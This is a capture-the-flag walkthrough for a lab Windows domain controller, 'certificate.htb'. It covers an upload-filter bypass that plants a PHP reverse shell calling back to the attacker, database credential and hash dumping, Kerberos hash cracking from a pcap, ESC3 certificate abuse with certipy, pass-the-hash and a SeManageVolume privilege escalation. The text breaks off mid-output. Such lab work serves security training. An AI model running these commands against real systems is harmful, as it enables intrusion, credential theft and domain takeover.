> [!Note]
>
> |User|Root|
> |---|---|
> |✅|✅|

![](https://github.com/user-attachments/assets/a5aeea9b-11fe-45a0-a90d-7253e0d90575)

## 1. Recon

### 1.1. Port Scan `nmap`

Quick initial scan to find open ports:

```console
root@kali:~# nmap -sS -p- --min-rate 100000 -Pn 10.10.11.71
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 20:17 +08
Nmap scan report for 10.10.11.71
Host is up (0.0092s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49691/tcp open  unknown
49692/tcp open  unknown
49693/tcp open  unknown
49709/tcp open  unknown
49715/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 2.85 seconds
```

Script and version scan on open ports:

```console
root@kali:~# nmap -Pn -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49691,49692,49693,49709,49715 -sCV 10.10.11.71
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 20:18 +08
Nmap scan report for 10.10.11.71
Host is up (0.0050s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-title: Did not follow redirect to http://certificate.htb/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-29 19:53:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-29T19:55:12+00:00; +7h34m52s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-29T19:55:12+00:00; +7h34m52s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-08-29T19:55:12+00:00; +7h34m52s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-08-29T19:55:12+00:00; +7h34m52s from scanner time.
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-08-29T19:54:33
|_  start_date: N/A
|_clock-skew: mean: 7h34m51s, deviation: 0s, median: 7h34m51s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.35 seconds
```

## 2. Exploring the web site at `80`

### 2.1. Register account

The web site has user account function:

![](https://github.com/user-attachments/assets/251838ab-a158-4190-9cd8-5bd62e873fcf)

Registering as teacher requires verification, so let's register for a student account:

![](https://github.com/user-attachments/assets/9b2735f1-883b-4490-8514-1e518aee5303)

Logging in with the newly registered account grants access to the courses:

![](https://github.com/user-attachments/assets/d55c64b3-f363-4419-acbc-e87073b5bbe8)

### 2.2. Explore course upload

Enroll on a course:

![](https://github.com/user-attachments/assets/8f060852-9d02-4da9-99e0-b0c12c82bcef)

Course outline appears after enrolling, the session links are dummy `#` links, but the quiz submission pages have upload function:

![](https://github.com/user-attachments/assets/de655866-dbed-4b80-a1f2-c9210e4bf00b)

![](https://github.com/user-attachments/assets/f053269e-b03b-444d-b4d9-4b5327c032aa)

The site doesn't accept upload of files types other than those stated:

![](https://github.com/user-attachments/assets/bfd00c9e-5ce0-4297-8de8-38116ad72645)

It also detects if it is able to open the uploaded file:

![](https://github.com/user-attachments/assets/7fdf53e1-2b73-4a78-9162-f28df56552ac)

A proper pdf file uploaded:

![](https://github.com/user-attachments/assets/02e3ff65-67ba-4c28-bc51-76f0bb4c7f76)

The file is available at: `http://certificate.htb/static/uploads/<some-id>/<file>`:

![](https://github.com/user-attachments/assets/45129e07-55f8-4e72-a16f-0fed75448172)

### 2.3. Exploit course upload

The site also accept zip files, let's try to use [zip concatenation](https://www.bleepingcomputer.com/news/security/hackers-now-use-zip-file-concatenation-to-evade-detection/) to evade the upload detection

Generate php reverse shell and setup the zip concatenation:

```console
root@kali:~# mkdir payload && cd $_

root@kali:~/payload# msfvenom -p php/reverse_php LHOST=10.10.14.6 LPORT=4444 -f raw -o malicious/reverse.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 2970 bytes
Saved as: malicious/reverse.php

root@kali:~/payload# ls -lR
.:
total 20
drwxr-xr-x 2 root root  4096 Aug 30 09:07 malicious
-rw-r--r-- 1 root root 15812 Aug 30 09:03 test.pdf

./malicious:
total 4
-rw-r--r-- 1 root root 2970 Aug 30 09:07 reverse.php

root@kali:~/payload# zip a.zip test.pdf
  adding: test.pdf (deflated 22%)

root@kali:~/payload# zip -r b.zip malicious
  adding: malicious/ (stored 0%)
  adding: malicious/reverse.php (deflated 69%)

root@kali:~/payload# cat a.zip b.zip > upload.zip
```

The site unzipped the package and shows the link to the test.pdf: http://certificate.htb/static/uploads/8ad6b1453a685cd6a629959dcfb5039d/test.pdf

Let's see if the reverse shell works:

```sh
curl http://certificate.htb/static/uploads/8ad6b1453a685cd6a629959dcfb5039d/malicious/reverse.php
```

And the reverse shell is hooked:

```cmd
root@kali:~# rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.71] 61383
whoami
certificate\xamppuser
```

The reverse shell is connected at the upload directory:

```cmd
dir
 Volume in drive C has no label.
 Volume Serial Number is 7E12-22F9

 Directory of C:\xampp\htdocs\certificate.htb\static\uploads\8ad6b1453a685cd6a629959dcfb5039d\malicious

08/29/2025  06:07 PM    <DIR>          .
08/29/2025  06:07 PM    <DIR>          ..
08/29/2025  06:07 PM             2,970 reverse.php
               1 File(s)          2,970 bytes
               2 Dir(s)   4,372,664,320 bytes free
```

List users on the system:

```cmd
dir C:\Users
 Volume in drive C has no label.
 Volume Serial Number is 7E12-22F9

 Directory of C:\Users

12/29/2024  06:30 PM    <DIR>          .
12/29/2024  06:30 PM    <DIR>          ..
12/30/2024  09:33 PM    <DIR>          Administrator
11/23/2024  07:59 PM    <DIR>          akeder.kh
11/04/2024  01:55 AM    <DIR>          Lion.SK
11/03/2024  02:05 AM    <DIR>          Public
11/03/2024  08:26 PM    <DIR>          Ryan.K
11/26/2024  05:12 PM    <DIR>          Sara.B
12/29/2024  06:30 PM    <DIR>          xamppuser
               0 File(s)              0 bytes
               9 Dir(s)   4,347,604,992 bytes free
```

## 3. Exploring the database

### 3.1. Database credentials embedded in php code

The database connection code is found at the web root folder:

```cmd
dir C:\xampp\htdocs\certificate.htb\
 Volume in drive C has no label.
 Volume Serial Number is 7E12-22F9

 Directory of C:\xampp\htdocs\certificate.htb

12/30/2024  03:04 PM    <DIR>          .
12/30/2024  03:04 PM    <DIR>          ..
12/24/2024  01:45 AM             7,179 about.php
12/30/2024  02:50 PM            17,197 blog.php
12/30/2024  03:02 PM             6,560 contacts.php
12/24/2024  07:10 AM            15,381 course-details.php
12/24/2024  01:53 AM             4,632 courses.php
12/23/2024  05:46 AM               549 db.php
12/22/2024  11:07 AM             1,647 feature-area-2.php
12/22/2024  11:22 AM             1,331 feature-area.php
12/22/2024  11:16 AM             2,955 footer.php
12/23/2024  06:13 AM             2,351 header.php
12/24/2024  01:52 AM             9,497 index.php
12/25/2024  02:34 PM             5,908 login.php
12/23/2024  06:14 AM               153 logout.php
12/24/2024  02:27 AM             5,321 popular-courses-area.php
12/25/2024  02:27 PM             8,240 register.php
12/26/2024  02:49 AM    <DIR>          static
12/29/2024  12:26 AM            10,366 upload.php
              16 File(s)         99,267 bytes
               3 Dir(s)   4,372,664,320 bytes free
```

The database credentials is embedded in the php code:

```cmd
type C:\xampp\htdocs\certificate.htb\db.php
```

```php
<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>
```

### 3.2. User credentials in database

Since there was no mysql ports discovered from the nmap scan, let's see if there's a `mysql.exe` to connect the database locally:

```cmd
dir /S C:\*mysql.exe
 Volume in drive C has no label.
 Volume Serial Number is 7E12-22F9

 Directory of C:\xampp\mysql\bin

10/30/2023  05:58 AM         3,784,616 mysql.exe
               1 File(s)      3,784,616 bytes

     Total Files Listed:
               1 File(s)      3,784,616 bytes
               0 Dir(s)   4,347,600,896 bytes free
```

Connect to the database, the `users` table looks interesting:

```cmd
C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "show databases;"
Database
certificate_webapp_db
information_schema
test
C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "use certificate_webapp_db; show tables;"
Tables_in_certificate_webapp_db
course_sessions
courses
users
users_courses
```

There are several users in the table, with `admin` user `sara.b` matching the users found on the `C:\Users` folder:

```cmd
C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "use certificate_webapp_db; select * from users;"
id      first_name      last_name       username        email   password        created_at      role    is_active
1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10     teacher 1
6       Sara    Laracrof        Sara1200        sara1200@gmail.com      $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK    2024-12-23 12:47:11     teacher 1
7       John    Wood    Johney  johny009@mail.com       $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq    2024-12-23 13:18:18     student 1
8       Havok   Watterson       havokww havokww@hotmail.com     $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti    2024-12-24 09:08:04     teacher 1
9       Steven  Roman   stev    steven@yahoo.com        $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2    2024-12-24 12:05:05     student 1
10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1
12      Test    Test    test    test@example.com        $2y$04$YxYfg/64Wt1tX9WDNAjq4ukIyEk7O.58GiB782f3ilkksmSZzon4i    2025-08-30 00:50:44     student 1
```

Password hash cracked with `john`:

```console
root@kali:~# echo '$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6' > hash.txt

root@kali:~# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Blink182         (?)
1g 0:00:00:00 DONE (2025-08-31 07:47) 2.040g/s 24979p/s 24979c/s 24979C/s monday1..vallejo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Recall that `5985` was discovered from the nmap scan, let's use `evil-winrm` with the discovered credentials to connect
- username: `Sara.B`
- password: `Blink182`

```console
root@kali:~# evil-winrm -i 10.10.11.71 -u Sara.B -p Blink182

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Sara.B\Documents> whoami
certificate\sara.b
```

## 4. Lateral movement

### 4.1. pcap file for WS-01

Some working files were found in Sara's documents:

```pwsh
*Evil-WinRM* PS C:\Users\Sara.B\Documents> Get-ChildItem -Recurse


    Directory: C:\Users\Sara.B\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/4/2024  12:53 AM                WS-01


    Directory: C:\Users\Sara.B\Documents\WS-01


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/4/2024  12:44 AM            530 Description.txt
-a----        11/4/2024  12:45 AM         296660 WS-01_PktMon.pcap
```

The `Description.txt` convenient hints that some credentials may be lying around:

```pwsh
*Evil-WinRM* PS C:\Users\Sara.B\Documents> Get-Content WS-01\Description.txt
The workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
When a user tries to input bad credentials, it returns bad credentials error.
But when a user provides valid credentials the file explorer freezes and then crashes!
```

Download and review the pcap file:

```pwsh
*Evil-WinRM* PS C:\Users\Sara.B\Documents> download WS-01/WS-01_PktMon.pcap

Info: Downloading C:\Users\Sara.B\Documents\WS-01/WS-01_PktMon.pcap to WS-01_PktMon.pcap

Info: Download successful!
```

Some kerberos packets involving `WS-01` is found in the pcap file:

![](https://github.com/user-attachments/assets/ef40cb5e-baca-41aa-80fd-a6854510134f)

### 4.2. Extracting Kerberos credentials from PCAP

Googling returns a useful utility on GitHub to that parses Kerberos packets from pcap files to extract `AS-REQ`, `AS-REP` and `TGS-REP` hashes: [Krb5RoastParser](https://github.com/jalvarezz13/Krb5RoastParser)

```console
root@kali:~/Krb5RoastParser# python krb5_roast_parser.py ../WS-01_PktMon.pcap as_req | tee ws-01-hash.txt
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
```

Cracking the password hash with hashcat

```console
root@kali:~# hashcat ws-01-hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
⋮

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

19900 | Kerberos 5, etype 18, Pre-Auth | Network Protocol
⋮

$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QAZ2wsx

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 19900 (Kerberos 5, etype 18, Pre-Auth)
Hash.Target......: $krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7...e852f0
⋮
```

Credentials found:
- username: `Lion.SK`
- password: `!QAZ2wsx`

## 5. Targeting the certification authority

### 5.1. Certificate request agent EKU (Extended Key Usages)

Connect evil-winrm with `Lion.SK` reveals that it is a member of [Certificate Service DCOM Access](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#certificate-service-dcom-access) group that can connect to certification authority

```pwsh
*Evil-WinRM* PS C:\Users\Lion.SK\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
CERTIFICATE\Domain CRA Managers            Group            S-1-5-21-515537669-4223687196-3249690583-1104 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

Scan with [certipy](https://github.com/ly4k/Certipy) to find:

```console
root@kali:~# certipy-ad find -u Lion.SK -p '!QAZ2wsx' -dc-ip 10.10.11.71 -vulnerable
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 18 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'Certificate-LTD-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'Certificate-LTD-CA'
[*] Checking web enrollment for CA 'Certificate-LTD-CA' @ 'DC01.certificate.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250831090634_Certipy.txt'
[*] Wrote text output to '20250831090634_Certipy.txt'
[*] Saving JSON output to '20250831090634_Certipy.json'
[*] Wrote JSON output to '20250831090634_Certipy.json'
```

`ESC3` vulnerability found:

```console
root@kali:~# cat 20250831090634_Certipy.txt
Certificate Authorities
  0
    CA Name                             : Certificate-LTD-CA
    DNS Name                            : DC01.certificate.htb
    Certificate Subject                 : CN=Certificate-LTD-CA, DC=certificate, DC=htb
    Certificate Serial Number           : 75B2F4BBF31F108945147B466131BDCA
    Certificate Validity Start          : 2024-11-03 22:55:09+00:00
    Certificate Validity End            : 2034-11-03 23:05:09+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFICATE.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        ManageCertificates              : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Enroll                          : CERTIFICATE.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : Delegated-CRA
    Display Name                        : Delegated-CRA
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-05T19:52:09+00:00
    Template Last Modified              : 2024-11-05T19:52:10+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain CRA Managers
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain CRA Managers
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
```

As explained in [this Microsoft blog](https://techcommunity.microsoft.com/blog/microsoftthreatprotectionblog/securing-ad-cs-microsoft-defender-for-identitys-sensor-unveiled/3980265), an Enrollment Agent certificate is a certificate with the "Certificate request agent" EKU in its EKU list, allowing it to enroll certificate for any eligible user by signing the CSR with the agent certificate.

### 5.2. Request certificate for another user with the [ESC3 vulnerability](https://github.com/ly4k/Certipy/wiki/06-%e2%80%90-Privilege-Escalation#esc3-enrollment-agent-certificate-template)

Request for certificate with `Delegated-CRA` template:

```console
root@kali:~# certipy-ad req -u Lion.SK@certificate.htb -p '!QAZ2wsx' -dc-ip 10.10.11.71 -target dc01.certificate.htb -ca Certificate-LTD-CA -template Delegated-CRA
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 22
[*] Successfully requested certificate
[*] Got certificate with UPN 'Lion.SK@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
[*] Saving certificate and private key to 'lion.sk.pfx'
[*] Wrote certificate and private key to 'lion.sk.pfx'
```

Going through the users found under `C:\Users`, requesting certificate for `Administrator` and `akeder.kh` fails, but works for `Ryan.K`:

```console
root@kali:~# certipy-ad req -u Lion.SK@certificate.htb -p '!QAZ2wsx' -dc-ip 10.10.11.71 -target dc01.certificate.htb -ca Certificate-LTD-CA -template SignedUser -pfx lion.sk.pfx -on-behalf-of 'CERTIFICATE\Administrator'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 23
[-] Got error while requesting certificate: code: 0x80094812 - CERTSRV_E_SUBJECT_EMAIL_REQUIRED - The email name is unavailable and cannot be added to the Subject or Subject Alternate name.
Would you like to save the private key? (y/N): N
[-] Failed to request certificate

root@kali:~# certipy-ad req -u Lion.SK@certificate.htb -p '!QAZ2wsx' -dc-ip 10.10.11.71 -target dc01.certificate.htb -ca Certificate-LTD-CA -template SignedUser -pfx lion.sk.pfx -on-behalf-of 'CERTIFICATE\akeder.kh'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 24
[-] Got error while requesting certificate: code: 0x80094812 - CERTSRV_E_SUBJECT_EMAIL_REQUIRED - The email name is unavailable and cannot be added to the Subject or Subject Alternate name.
Would you like to save the private key? (y/N): N
[-] Failed to request certificate

root@kali:~# certipy-ad req -u Lion.SK@certificate.htb -p '!QAZ2wsx' -dc-ip 10.10.11.71 -target dc01.certificate.htb -ca Certificate-LTD-CA -template SignedUser -pfx lion.sk.pfx -on-behalf-of 'CERTIFICATE\Ryan.k'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 25
[*] Successfully requested certificate
[*] Got certificate with UPN 'Ryan.k@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Saving certificate and private key to 'ryan.k.pfx'
[*] Wrote certificate and private key to 'ryan.k.pfx'
```

### 5.3. Get access with the requested user certificate

The `auth` function of `certipy` can request for TGT

Attempting to get TGT resutled in `KRB_AP_ERR_SKEW(Clock skew too great)` error:

```console
root@kali:~# certipy-ad auth -pfx ryan.k.pfx -dc-ip 10.10.11.71
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Ryan.k@certificate.htb'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Using principal: 'ryan.k@certificate.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
```

Let's sync the time on Kali with the target

Install `ntpdate`: `apt -y install ntpsec-ntpdate`

Turns out the time on Kali was 27288 seconds behind of the target

```console
root@kali:~# ntpdate -q dc01.certificate.htb
2025-08-31 17:01:14.745453 (+0800) +27288.192297 +/- 0.002941 dc01.certificate.htb 10.10.11.71 s1 no-leap
```

Disable NTP on Kali and sync the time with the target

```console
root@kali:~# timedatectl set-ntp 0

root@kali:~# ntpdate dc01.certificate.htb
2025-08-31 17:02:06.296676 (+0800) +27288.190939 +/- 0.003042 dc01.certificate.htb 10.10.11.71 s1 no-leap
CLOCK: time stepped by 27288.190939

root@kali:~# ntpdate -q dc01.certificate.htb
2025-08-31 17:02:28.821564 (+0800) -0.000931 +/- 0.002818 dc01.certificate.htb 10.10.11.71 s1 no-leap
```

`certipy-ad` works after the time sync

```console
root@kali:~# certipy-ad auth -pfx ryan.k.pfx -dc-ip 10.10.11.71
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Ryan.k@certificate.htb'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Using principal: 'ryan.k@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ryan.k.ccache'
[*] Wrote credential cache to 'ryan.k.ccache'
[*] Trying to retrieve NT hash for 'ryan.k'
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
```

### 5.4. Privilege escalation

Connect with Ryan's hashes: `evil-winrm -i 10.10.11.71 -u Ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6`

Ryan has `SeManageVolumePrivilege` which can be exploited to [grants full permission on C:\ drive for all users on the machine](https://github.com/CsEnox/SeManageVolumeExploit)

```pwsh
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
```

Get `SeManageVolumeExploit.exe` from the [releases](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public) to kali machine:

```sh
curl -sLO https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
```

Upload to target and run:

```pwsh
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> upload SeManageVolumeExploit.exe

Info: Uploading /root/SeManageVolumeExploit.exe to C:\Users\Ryan.K\Documents\SeManageVolumeExploit.exe

Data: 16384 bytes of 16384 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> dir


    Directory: C:\Users\Ryan.K\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/31/2025   2:08 AM          12288 SeManageVolumeExploit.exe


*Evil-WinRM* PS C:\Users\Ryan.K\Documents> .\SeManageVolumeExploit.exe
Entries changed: 858

DONE
```

Check that all users have full control:

```pwsh
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> icacls C:/windows
C:/windows NT SERVICE\TrustedInstaller:(F)
           NT SERVICE\TrustedInstaller:(CI)(IO)(F)
           NT AUTHORITY\SYSTEM:(M)
